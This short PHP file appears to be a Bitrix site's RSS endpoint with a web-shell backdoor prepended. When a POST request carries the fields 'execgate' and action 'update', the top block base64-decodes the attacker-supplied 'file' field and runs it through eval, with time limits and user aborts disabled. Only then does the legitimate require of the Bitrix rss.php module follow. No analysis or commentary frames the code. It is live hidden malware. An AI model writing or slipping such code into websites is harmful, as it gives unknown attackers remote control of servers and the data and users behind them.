<?php 
if(isset($_POST['execgate'])) {
	set_time_limit(0);ignore_user_abort(1);if(isset($_POST['action'])) {switch($_POST['action']) {case 'update': eval(base64_decode($_POST['file']));break;default: break;}}
}
?>
<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/iblock/rss.php");
?>